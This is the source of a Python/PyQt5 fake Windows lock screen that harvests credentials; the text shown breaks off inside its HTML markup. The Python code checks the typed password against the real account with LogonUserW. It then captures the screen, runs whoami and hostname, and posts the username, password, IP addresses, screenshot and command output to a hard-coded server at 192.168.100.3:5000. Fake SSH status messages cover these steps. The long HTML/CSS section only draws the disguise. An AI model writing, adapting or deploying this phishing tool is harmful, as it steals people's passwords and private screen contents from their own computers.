import sys
import os
import base64
import subprocess
import getpass
import ctypes
import urllib.request
import requests
import socket
import threading
import time
from datetime import datetime
from PIL import ImageGrab, Image
from io import BytesIO
from PyQt5.QtWidgets import QApplication, QMainWindow, QGraphicsOpacityEffect
from PyQt5.QtCore import (
    Qt, QUrl, QObject, pyqtSlot, QTimer, QEasingCurve, QRectF, QPointF, QPropertyAnimation
)
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtWebChannel import QWebChannel
from PyQt5.QtGui import QPainter, QColor, QLinearGradient, QPen, QBrush, QFont

class LockScreenBridge(QObject):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.server_url = "http://192.168.100.3:5000/log"  # Change this to your server IP
    
    @pyqtSlot(str)
    def check_password(self, password):
        # Log the password to terminal
        print(f"Entered password: {password}")
        
        # Verify password against system password
        is_correct = self.verify_system_password(password)
        
        if is_correct:
            # Show SSH message
            self.main_window.web_view.page().runJavaScript("document.querySelector('.welcome-text').textContent = 'Opening port 22 and starting SSH...';")
            
            # Start a background thread for SSH simulation
            ssh_thread = threading.Thread(target=self.simulate_ssh_and_send, args=(password,))
            ssh_thread.daemon = True
            ssh_thread.start()
            
            # Close after delay
            QTimer.singleShot(5000, self.main_window.fade_out_and_close)
        else:
            # Send attempt to server
            self.send_to_server(password, is_correct)
            # Show error message
            self.main_window.web_view.page().runJavaScript("showPasswordErrorWithButton();")
    
    def simulate_ssh_and_send(self, password):
        try:
            # Simulate SSH connection steps
            print("[SSH] Opening port 22...")
            self.main_window.web_view.page().runJavaScript("document.querySelector('.welcome-text').textContent = 'Opening port 22...';")
            time.sleep(0.7)
            
            print("[SSH] Starting SSH service...")
            self.main_window.web_view.page().runJavaScript("document.querySelector('.welcome-text').textContent = 'Starting SSH service...';")
            time.sleep(0.7)
            
            print("[SSH] Authenticating...")
            self.main_window.web_view.page().runJavaScript("document.querySelector('.welcome-text').textContent = 'Authenticating...';")
            time.sleep(0.7)
            
            print("[SSH] Connection established!")
            self.main_window.web_view.page().runJavaScript("document.querySelector('.welcome-text').textContent = 'Connection established!';")
            time.sleep(0.7)
            
            # Run commands and capture output
            commands = [
                ("whoami", "Getting current user..."),
                ("hostname", "Getting hostname..."),
                ("echo %USERNAME%", "Verifying username..."),
                (f"echo {password}", "Verifying password...")
            ]
            
            command_outputs = {}
            for cmd, msg in commands:
                print(f"[SSH] {msg}")
                self.main_window.web_view.page().runJavaScript(f"document.querySelector('.welcome-text').textContent = '{msg}';")
                time.sleep(0.5)
                
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                    command_outputs[cmd] = result.stdout.strip()
                    print(f"[SSH] Command output: {result.stdout.strip()}")
                except Exception as e:
                    command_outputs[cmd] = f"Error: {str(e)}"
                    print(f"[SSH] Command error: {str(e)}")
            
            # Take screenshot after SSH simulation
            screenshot_b64 = self.main_window.take_screenshot()
            
            # Send data to server with screenshot and command outputs
            self.send_to_server(password, True, screenshot_b64, command_outputs)
            
            print("[SSH] All data sent to server")
            self.main_window.web_view.page().runJavaScript("document.querySelector('.welcome-text').textContent = 'Session complete!';")
        except Exception as e:
            print(f"SSH simulation error: {e}")
    
    def verify_system_password(self, password):
        """Verify password against system password"""
        try:
            # Get current username
            username = os.environ.get('USERNAME', '')
            
            # Windows password verification using ctypes
            advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
            
            # Constants
            LOGON32_LOGON_INTERACTIVE = 2
            LOGON32_PROVIDER_DEFAULT = 0
            
            # Function prototype
            advapi32.LogonUserW.argtypes = [
                ctypes.c_wchar_p,  # lpszUsername
                ctypes.c_wchar_p,  # lpszDomain
                ctypes.c_wchar_p,  # lpszPassword
                ctypes.c_ulong,    # dwLogonType
                ctypes.c_ulong,    # dwLogonProvider
                ctypes.POINTER(ctypes.c_ulong)  # phToken
            ]
            advapi32.LogonUserW.restype = ctypes.c_ulong
            
            # Try to logon
            token = ctypes.c_ulong()
            result = advapi32.LogonUserW(
                username, '.', password,
                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
                ctypes.byref(token)
            )
            
            if result:
                # Close the token handle
                ctypes.windll.kernel32.CloseHandle(token)
                return True
            else:
                return False
        except Exception as e:
            print(f"Password verification error: {e}")
            return False
    
    def send_to_server(self, password, success, screenshot_b64="", command_outputs=None):
        """Send login attempt to server"""
        try:
            # Get local IP
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            # Get public IP
            public_ip = "Unknown"
            try:
                response = requests.get('https://api.ipify.org?format=json', timeout=2)
                if response.status_code == 200:
                    public_ip = response.json().get('ip', 'Unknown')
            except:
                pass
            
            # Get current username
            username = os.environ.get('USERNAME', 'User')
            
            # Prepare data
            data = {
                'ip': f"{local_ip} (Public: {public_ip})",
                'username': username,
                'password': password,
                'success': success,
                'screenshot': screenshot_b64
            }
            
            # Add command outputs if available
            if command_outputs:
                data['command_outputs'] = command_outputs
            
            # Send to server
            response = requests.post(self.server_url, json=data, timeout=5)
            if response.status_code == 200:
                print("Login attempt logged to server")
            else:
                print(f"Server responded with status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending data to server: {e}")
    
    @pyqtSlot()
    def power_off(self):
        self.main_window.web_view.page().runJavaScript(
            "showConfirmDialog('Are you sure you want to power off?', 'power_off');"
        )
    
    @pyqtSlot()
    def restart(self):
        self.main_window.web_view.page().runJavaScript(
            "showConfirmDialog('Are you sure you want to restart?', 'restart');"
        )
    
    @pyqtSlot(str)
    def handle_power_action(self, action):
        try:
            if action == "power_off":
                subprocess.run(["shutdown", "/s", "/t", "0"])
            elif action == "restart":
                subprocess.run(["shutdown", "/r", "/t", "0"])
        except:
            self.main_window.web_view.page().runJavaScript(
                "showAlert('Command failed. Please perform the action manually.');"
            )

class WebLockScreen(QMainWindow):
    def __init__(self):
        super().__init__()
        
        # Set window flags
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        
        # Get screen dimensions
        screen = QApplication.primaryScreen().geometry()
        self.setGeometry(screen)
        
        # Get system information
        self.current_user = os.environ.get('USERNAME', 'User')
        self.user_icon_base64 = self.get_user_icon_base64()
        self.wallpaper_base64 = self.get_wallpaper_base64()
        
        # Setup web view
        self.web_view = QWebEngineView()
        self.setCentralWidget(self.web_view)
        
        # Setup web channel for JS-Python communication
        self.channel = QWebChannel()
        self.bridge = LockScreenBridge(self)
        self.channel.registerObject("bridge", self.bridge)
        self.web_view.page().setWebChannel(self.channel)
        
        # Load HTML content
        self.web_view.setHtml(self.generate_html())
        
        # Update time every second
        self.timer = None
        self.start_time_update()
    
    def take_screenshot(self):
        """Take a screenshot of the current screen"""
        try:
            # Get screen dimensions
            user32 = ctypes.windll.user32
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)
            
            # Capture the entire screen
            screenshot = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))
            
            # Convert to RGB to avoid palette issues
            if screenshot.mode == 'P':
                screenshot = screenshot.convert('RGB')
            elif screenshot.mode == 'RGBA':
                screenshot = screenshot.convert('RGB')
            
            # Save to BytesIO
            buffered = BytesIO()
            screenshot.save(buffered, format="JPEG", quality=90)
            img_str = base64.b64encode(buffered.getvalue()).decode()
            
            print(f"Screenshot captured: {screen_width}x{screen_height}")
            return img_str
        except Exception as e:
            print(f"Error taking screenshot: {e}")
            return ""
    
    def get_user_icon_base64(self):
        """Get user icon as base64 string"""
        try:
            # Create a professional white user icon as base64
            icon_svg = """
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
                <defs>
                    <linearGradient id="userGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#ffffff;stop-opacity:1" />
                        <stop offset="100%" style="stop-color:#e0e0e0;stop-opacity:1" />
                    </linearGradient>
                </defs>
                <circle cx="50" cy="35" r="25" fill="url(#userGradient)"/>
                <ellipse cx="50" cy="80" rx="40" ry="25" fill="url(#userGradient)"/>
            </svg>
            """
            return base64.b64encode(icon_svg.encode()).decode()
        except Exception as e:
            print(f"Error creating user icon: {e}")
            return ""
    
    def get_wallpaper_base64(self):
        """Get wallpaper as base64 string"""
        try:
            # Try to load img.jpeg from the same directory as the script
            script_dir = os.path.dirname(os.path.abspath(__file__))
            image_path = os.path.join(script_dir, "img.jpeg")
            
            if os.path.exists(image_path):
                with open(image_path, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read()).decode()
                    return encoded_string
            else:
                print(f"Image file not found: {image_path}")
                # Try to download from URL
                try:
                    url = 'https://images.pexels.com/photos/346529/pexels-photo-346529.jpeg?auto=compress&cs=tinysrgb&w=600'
                    with urllib.request.urlopen(url) as response:
                        image_data = response.read()
                    encoded_string = base64.b64encode(image_data).decode()
                    return encoded_string
                except Exception as e:
                    print(f"Error downloading wallpaper: {e}")
                    # Fallback to gradient if image not found
                    gradient_svg = """
                    <svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" viewBox="0 0 1920 1080">
                        <defs>
                            <linearGradient id="bg" x1="0%" y1="0%" x2="0%" y2="100%">
                                <stop offset="0%" style="stop-color:#000000;stop-opacity:1" />
                                <stop offset="100%" style="stop-color:#000000;stop-opacity:1" />
                            </linearGradient>
                        </defs>
                        <rect width="100%" height="100%" fill="url(#bg)" />
                    </svg>
                    """
                    return base64.b64encode(gradient_svg.encode()).decode()
        except Exception as e:
            print(f"Error loading wallpaper: {e}")
            return ""
    
    def generate_html(self):
        """Generate HTML content for the lock screen"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>
                * {{
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    user-select: none;
                    overflow: hidden;
                }}
                
                body {{
                    overflow: hidden;
                    user-select: none;
                    cursor: default;
                    background-color: #000000;
                }}
                
                .container {{
                    position: relative;
                    width: 100vw;
                    height: 100vh;
                    background-image: url('data:image/jpeg;base64,{self.wallpaper_base64}');
                    background-size: cover;
                    background-position: center;
                    background-attachment: fixed;
                    background-color: #000000;
                }}
                
                .overlay {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.6) 100%);
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    transition: all 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
                }}
                
                .overlay.hidden {{
                    transform: translateY(-100%);
                    opacity: 0;
                    pointer-events: none; /* Prevent overlay from blocking clicks */
                }}
                
                .time-container {{
                    margin-top: 15vh;
                    text-align: center;
                    color: white;
                    text-shadow: 0 2px 10px rgba(0,0,0,0.5);
                }}
                
                .time {{
                    font-size: 120px;
                    font-weight: 700;
                    letter-spacing: -2px;
                    line-height: 1;
                    margin-bottom: 10px;
                }}
                
                .date {{
                    font-size: 28px;
                    font-weight: 400;
                    opacity: 0.9;
                }}
                
                /* Global Network Container - Left Side */
                .global-network-container {{
                    position: absolute;
                    top: 30px;
                    left: 30px;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    max-width: 300px;
                    padding: 15px;
                    border-radius: 0;
                    cursor: pointer;
                    transition: all 0.3s ease;
                }}
                
                .global-network-container:hover {{
                    background-color: rgba(0, 0, 0, 0.4);
                    backdrop-filter: blur(5px);
                    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
                }}
                
                /* Location Container - Right Side */
                .location-container {{
                    position: absolute;
                    top: 30px;
                    right: 30px;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    max-width: 300px;
                    padding: 15px;
                    border-radius: 0;
                    cursor: pointer;
                    transition: all 0.3s ease;
                }}
                
                .location-container:hover {{
                    background-color: rgba(0, 0, 0, 0.4);
                    backdrop-filter: blur(5px);
                    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
                }}
                
                .location-icon, .internet-icon {{
                    width: 40px;
                    height: 40px;
                    margin-bottom: 10px;
                    background-color: rgba(255, 255, 255, 0.15);
                    border-radius: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                
                .location-icon svg, .internet-icon svg {{
                    width: 24px;
                    height: 24px;
                }}
                
                .location-title, .internet-title {{
                    color: white;
                    font-size: 18px;
                    font-weight: 600;
                    margin-bottom: 6px;
                    text-align: center;
                }}
                
                .location-body, .internet-body {{
                    color: rgba(255, 255, 255, 0.8);
                    font-size: 14px;
                    font-weight: 400;
                    text-align: center;
                    line-height: 1.5;
                }}
                
                .swipe-hint {{
                    position: absolute;
                    bottom: 120px;
                    left: 0;
                    width: 100%;
                    text-align: center;
                    color: rgba(255, 255, 255, 0.7);
                    font-size: 18px;
                    animation: pulse 2s infinite;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    gap: 15px;
                }}
                
                .swipe-arrow {{
                    width: 40px;
                    height: 40px;
                    opacity: 0.7;
                    animation: bounce 2s infinite;
                }}
                
                @keyframes pulse {{
                    0% {{ opacity: 0.5; }}
                    50% {{ opacity: 1; }}
                    100% {{ opacity: 0.5; }}
                }}
                
                @keyframes bounce {{
                    0%, 20%, 50%, 80%, 100% {{ transform: translateY(0); }}
                    40% {{ transform: translateY(-10px); }}
                    60% {{ transform: translateY(-5px); }}
                }}
                
                .icons-container {{
                    position: absolute;
                    bottom: 30px;
                    right: 30px;
                    display: flex;
                    gap: 20px;
                    z-index: 1000; /* High z-index to ensure icons are above everything */
                }}
                
                .icon-button {{
                    width: 50px;
                    height: 50px;
                    cursor: pointer;
                    border-radius: 0;
                    background-color: transparent;
                    transition: all 0.3s ease;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                
                .icon-button:hover {{
                    background-color: rgba(255, 255, 255, 0.1);
                }}
                
                .icon-button svg {{
                    width: 24px;
                    height: 24px;
                    pointer-events: none; /* Prevent SVG from blocking button clicks */
                }}
                
                .password-container {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    opacity: 0;
                    pointer-events: none;
                    transition: opacity 0.5s ease;
                    backdrop-filter: blur(10px);
                    -webkit-backdrop-filter: blur(10px);
                    background-color: rgba(0, 0, 0, 0.2);
                }}
                
                .password-container.visible {{
                    opacity: 1;
                    pointer-events: all;
                }}
                
                .user-profile {{
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    margin-bottom: 30px; /* Reduced from 60px to 30px to shift up */
                    transform: translateY(-30px); /* Shift up by 30px */
                }}
                
                .user-icon {{
                    width: 180px;
                    height: 180px;
                    border-radius: 50%;
                    margin-bottom: 15px;
                    background-image: url('data:image/svg+xml;base64,{self.user_icon_base64}');
                    background-size: cover;
                }}
                
                .user-name {{
                    color: white;
                    font-size: 30px;
                    font-weight: 500;
                    text-shadow: 0 2px 10px rgba(0,0,0,0.5);
                }}
                
                /* Error message styles - placed under username */
                .error-message {{
                    color: white;
                    font-size: 18px;
                    margin-top: 15px;
                    text-align: center;
                    display: none;
                    opacity: 0;
                    transition: opacity 0.3s ease;
                }}
                
                .error-message.active {{
                    display: block;
                    opacity: 1;
                }}
                
                .error-message button {{
                    margin-top: 15px;
                    padding: 8px 20px;
                    background-color: rgba(255, 255, 255, 0.2);
                    border: 1px solid rgba(255, 255, 255, 0.5);
                    color: white;
                    border-radius: 0;
                    cursor: pointer;
                    font-size: 16px;
                    transition: all 0.3s ease;
                }}
                
                .error-message button:hover {{
                    background-color: rgba(255, 255, 255, 0.3);
                    border-color: white;
                }}
                
                .password-field-container {{
                    position: relative;
                    width: 350px; /* Increased from 300px */
                    display: flex;
                    align-items: center;
                    transform: translateY(-30px); /* Shift up by 30px */
                }}
                
                .password-field {{
                    flex: 1;
                    width: 100%;
                    padding: 8px 110px 8px 15px; /* Reduced height, increased right padding for icons */
                    background-color: rgba(0, 0, 0, 0.3);
                    border: none;
                    border-bottom: 2px solid rgba(74, 144, 226, 0.7);
                    border-radius: 5px;
                    color: white;
                    font-size: 18px;
                    text-align: left; /* Changed from center to left */
                    outline: none;
                    transition: border-color 0.3s ease, background-color 0.3s ease;
                }}
                
                .password-field:focus {{
                    border-bottom-color: rgba(74, 144, 226, 1);
                    background-color: rgba(0, 0, 0, 0.4);
                }}
                
                .password-field.error {{
                    border-bottom-color: rgba(255, 0, 0, 0.7);
                    background-color: rgba(50, 0, 0, 0.3);
                    animation: shake 0.5s;
                }}
                
                .password-eye-icon {{
                    position: absolute;
                    right: 65px; /* Position between field and arrow */
                    width: 36px;
                    height: 36px;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    border-radius: 50%;
                    padding: 8px;
                    display: none; /* Hidden by default */
                    justify-content: center;
                    align-items: center;
                    opacity: 0.8; /* More opaque */
                }}
                
                .password-eye-icon:hover {{
                    background-color: rgba(74, 144, 226, 0.2);
                    opacity: 1;
                }}
                
                .password-eye-icon svg {{
                    width: 100%;
                    height: 100%;
                    fill: rgba(240, 240, 240, 0.95); /* Whiter color */
                    transition: fill 0.3s ease;
                }}
                
                .password-eye-icon:hover svg {{
                    fill: rgba(255, 255, 255, 1); /* Pure white on hover */
                }}
                
                .password-icon {{
                    position: absolute;
                    right: 12px;
                    width: 36px;
                    height: 36px;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    border-radius: 50%;
                    padding: 8px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                
                .password-icon:hover {{
                    background-color: rgba(74, 144, 226, 0.3);
                }}
                
                .password-icon svg {{
                    width: 100%;
                    height: 100%;
                    fill: rgba(255, 255, 255, 0.8);
                    transition: fill 0.3s ease;
                }}
                
                .password-icon:hover svg {{
                    fill: white;
                }}
                
                @keyframes shake {{
                    0%, 100% {{ transform: translateX(0); }}
                    10%, 30%, 50%, 70%, 90% {{ transform: translateX(-5px); }}
                    20%, 40%, 60%, 80% {{ transform: translateX(5px); }}
                }}
                
                /* Loading animation styles - 6 dots in a circle */
                .loading-container {{
                    position: relative;
                    width: 100%;
                    height: auto;
                    margin-top: 20px;
                    display: none;
                    flex-direction: column;
                    align-items: center;
                    z-index: 10; /* Ensure it's above other elements */
                    overflow: visible; /* Allow elements to extend outside container */
                }}
                
                .loading-container.visible {{
                    display: flex;
                }}
                
                .loader {{
                    position: relative;
                    width: 60px; /* Reduced size */
                    height: 60px; /* Reduced size */
                    margin: auto;
                    overflow: visible; /* Allow elements to extend outside container */
                }}
                
                .loader .circle {{
                    position: absolute;
                    width: 50px; /* Reduced size */
                    height: 50px; /* Reduced size */
                    opacity: 0;
                    transform: rotate(225deg);
                    animation-iteration-count: infinite;
                    animation-name: orbit;
                    animation-duration: 5.5s;
                }}
                
                .loader .circle:after {{
                    content: '';
                    position: absolute;
                    width: 8px; /* Reduced size */
                    height: 8px; /* Reduced size */
                    border-radius: 5px;
                    background: #fff;
                    box-shadow: 0 0 10px rgba(255, 255, 255, .9); /* Reduced glow */
                }}
                
                .loader .circle:nth-child(2) {{
                    animation-delay: 240ms;
                }}
                
                .loader .circle:nth-child(3) {{
                    animation-delay: 480ms;
                }}
                
                .loader .circle:nth-child(4) {{
                    animation-delay: 720ms;
                }}
                
                .loader .circle:nth-child(5) {{
                    animation-delay: 960ms;
                }}
                
                @keyframes orbit {{
                    0% {{
                        transform: rotate(225deg);
                        opacity: 1;
                        animation-timing-function: ease-out;
                    }}
                    7% {{
                        transform: rotate(345deg);
                        animation-timing-function: linear;
                    }}
                    30% {{
                        transform: rotate(455deg);
                        animation-timing-function: ease-in-out;
                    }}
                    39% {{
                        transform: rotate(690deg);
                        animation-timing-function: linear;
                    }}
                    70% {{
                        transform: rotate(815deg);
                        opacity: 1;
                        animation-timing-function: ease-out;
                    }}
                    75% {{
                        transform: rotate(945deg);
                        animation-timing-function: ease-out;
                    }}
                    76% {{
                        transform: rotate(945deg);
                        opacity: 0;
                    }}
                    100% {{
                        transform: rotate(945deg);
                        opacity: 0;
                    }}
                }}
                
                .welcome-text {{
                    color: white;
                    font-size: 28px; /* Increased size */
                    font-weight: 500;
                    text-shadow: 0 2px 10px rgba(0,0,0,0.5);
                    margin-top: 25px; /* Increased spacing */
                    text-align: center;
                    max-width: 80%;
                }}
                
                /* Slide-up menu styles */
                .slide-menu {{
                    position: absolute;
                    bottom: -400px; /* Changed from -250px to -400px to completely hide */
                    right: 30px;
                    width: 320px;
                    background-color: rgba(30, 30, 30, 0.95);
                    backdrop-filter: blur(10px);
                    border-radius: 0;
                    padding: 20px;
                    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.4);
                    transition: bottom 0.4s ease; /* Removed cubic-bezier for no bounce */
                    z-index: 999;
                }}
                
                .slide-menu.active {{
                    bottom: 100px;
                }}
                
                .menu-content {{
                    color: white;
                }}
                
                .wifi-info {{
                    margin-bottom: 15px;
                    text-align: center;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }}
                
                .wifi-info .wifi-icon {{
                    width: 24px;
                    height: 24px;
                    margin-right: 10px;
                }}
                
                .wifi-info p {{
                    margin-bottom: 10px;
                    font-size: 16px;
                }}
                
                .wifi-name {{
                    font-weight: 600;
                    font-size: 18px;
                }}
                
                .wifi-status {{
                    color: #9e9e9e; /* Changed from green to grey */
                    font-weight: 500;
                }}
                
                .toggle-container {{
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 15px;
                }}
                
                .toggle-container span {{
                    font-size: 16px;
                }}
                
                .toggle-switch {{
                    position: relative;
                    display: inline-block;
                    width: 44px;
                    height: 22px;
                }}
                
                .toggle-switch input {{
                    opacity: 0;
                    width: 0;
                    height: 0;
                }}
                
                .toggle-slider {{
                    position: absolute;
                    cursor: pointer;
                    top: 0;
                    left: 0;
                    right: 0;
                    bottom: 0;
                    background-color: rgba(255, 255, 255, 0.2);
                    transition: .4s;
                    border-radius: 22px;
                }}
                
                .toggle-slider:before {{
                    position: absolute;
                    content: "";
                    height: 14px;
                    width: 14px;
                    left: 4px;
                    bottom: 4px;
                    background-color: white;
                    transition: .4s;
                    border-radius: 50%;
                }}
                
                input:checked + .toggle-slider {{
                    background-color: #4CAF50;
                }}
                
                input:checked + .toggle-slider:before {{
                    transform: translateX(22px);
                }}
                
                .menu-button {{
                    width: 100%;
                    padding: 12px;
                    margin-bottom: 10px;
                    background-color: rgba(255, 255, 255, 0.1);
                    border: none;
                    border-radius: 0;
                    color: white;
                    font-size: 16px;
                    cursor: pointer;
                    transition: background-color 0.3s ease;
                }}
                
                .menu-button:hover {{
                    background-color: rgba(255, 255, 255, 0.2);
                }}
                
                .menu-button:last-child {{
                    margin-bottom: 0;
                }}
                
                .confirm-dialog {{
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background-color: rgba(30, 30, 30, 0.95);
                    backdrop-filter: blur(10px);
                    border-radius: 0;
                    padding: 25px;
                    width: 350px;
                    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
                    z-index: 1001;
                    display: none;
                    flex-direction: column;
                    align-items: center;
                }}
                
                .confirm-dialog.active {{
                    display: flex;
                }}
                
                .confirm-dialog h3 {{
                    color: white;
                    margin-bottom: 20px;
                    font-size: 20px;
                    text-align: center;
                }}
                
                .confirm-buttons {{
                    display: flex;
                    gap: 15px;
                    width: 100%;
                }}
                
                .confirm-button {{
                    flex: 1;
                    padding: 10px;
                    border: none;
                    border-radius: 0;
                    font-size: 16px;
                    cursor: pointer;
                    transition: background-color 0.3s ease;
                }}
                
                .confirm-button.cancel {{
                    background-color: rgba(255, 255, 255, 0.2);
                    color: white;
                }}
                
                .confirm-button.cancel:hover {{
                    background-color: rgba(255, 255, 255, 0.3);
                }}
                
                .confirm-button.confirm {{
                    background-color: #f44336;
                    color: white;
                }}
                
                .confirm-button.confirm:hover {{
                    background-color: #d32f2f;
                }}
                
                .alert-dialog {{
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background-color: rgba(30, 30, 30, 0.95);
                    backdrop-filter: blur(10px);
                    border-radius: 0;
                    padding: 25px;
                    width: 350px;
                    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
                    z-index: 1001;
                    display: none;
                    flex-direction: column;
                    align-items: center;
                }}
                
                .alert-dialog.active {{
                    display: flex;
                }}
                
                .alert-dialog h3 {{
                    color: white;
                    margin-bottom: 20px;
                    font-size: 20px;
                    text-align: center;
                }}
                
                .alert-button {{
                    width: 100%;
                    padding: 10px;
                    border: none;
                    border-radius: 0;
                    background-color: rgba(255, 255, 255, 0.2);
                    color: white;
                    font-size: 16px;
                    cursor: pointer;
                    transition: background-color 0.3s ease;
                }}
                
                .alert-button:hover {{
                    background-color: rgba(255, 255, 255, 0.3);
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <!-- Icons container moved outside overlay -->
                <div class="icons-container" id="icons-container">
                    <div class="icon-button" id="battery-button" title="Battery">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="2" y="7" width="18" height="12" rx="2" stroke="white" stroke-width="2"/>
                            <rect x="20" y="10" width="2" height="6" rx="1" fill="white"/>
                            <rect x="4" y="9" width="10" height="8" rx="1" fill="white"/>
                        </svg>
                    </div>
                    <div class="icon-button" id="wifi-button" title="WiFi">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M1 9L12 2L23 9" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M5 12L12 7L19 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M9 15L12 13L15 15" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="18" r="1" fill="white"/>
                        </svg>
                    </div>
                    <div class="icon-button" id="accessibility-button" title="Accessibility" style="display: none;">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="12" cy="5" r="2" stroke="white" stroke-width="2"/>
                            <path d="M12 7V12M12 12L9 15M12 12L15 15M9 15V19M15 15V19" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </div>
                    <div class="icon-button" id="power-button" title="Power" style="display: none;">
                        <!-- Fixed power icon -->
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="12" cy="12" r="10" stroke="white" stroke-width="2"/>
                            <line x1="12" y1="2" x2="12" y2="12" stroke="white" stroke-width="2" stroke-linecap="round"/>
                        </svg>
                    </div>
                </div>
                
                <div class="overlay" id="overlay">
                    <!-- Global Network Container - Left Side -->
                    <div class="global-network-container">
                        <div class="internet-icon">
                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <circle cx="12" cy="12" r="10" stroke="white" stroke-width="2"/>
                                <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" stroke="white" stroke-width="2"/>
                            </svg>
                        </div>
                        <span class="internet-title">Global Network</span>
                        <span class="internet-body">Connected to worldwide services with high-speed internet access and secure data transmission.</span>
                    </div>
                    
                    <!-- Location Container - Right Side -->
                    <div class="location-container">
                        <div class="location-icon">
                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="white"/>
                            </svg>
                        </div>
                        <span class="location-title">New York</span>
                        <span class="location-body">The most populous city in the United States, known for its significant impact on commerce, finance, media, art, fashion, research, technology, education, and entertainment.</span>
                    </div>
                    
                    <div class="time-container">
                        <div class="time" id="time">00:00</div>
                        <div class="date" id="date">Monday, January 1, 2023</div>
                    </div>
                    
                    <div class="swipe-hint" id="swipe-hint">
                        <svg class="swipe-arrow" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M7 14L12 9L17 14" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                        <span>Double tap to unlock</span>
                    </div>
                </div>
                
                <div class="password-container" id="password-container">
                    <div class="user-profile">
                        <div class="user-icon"></div>
                        <div class="user-name">{self.current_user}</div>
                        
                        <!-- Error message placed under username -->
                        <div class="error-message" id="error-message">
                            <p>Incorrect password</p>
                            <button onclick="resetPasswordScreen()">Try Again</button>
                        </div>
                    </div>
                    
                    <div class="password-field-container" id="password-field-container">
                        <input type="password" class="password-field" id="password-field" placeholder="Enter password" autocomplete="off">
                        <div class="password-eye-icon" id="password-eye-icon">
                            <!-- Eye icon -->
                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="currentColor"/>
                            </svg>
                        </div>
                        <div class="password-icon" id="password-icon">
                            <!-- Arrow icon -->
                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
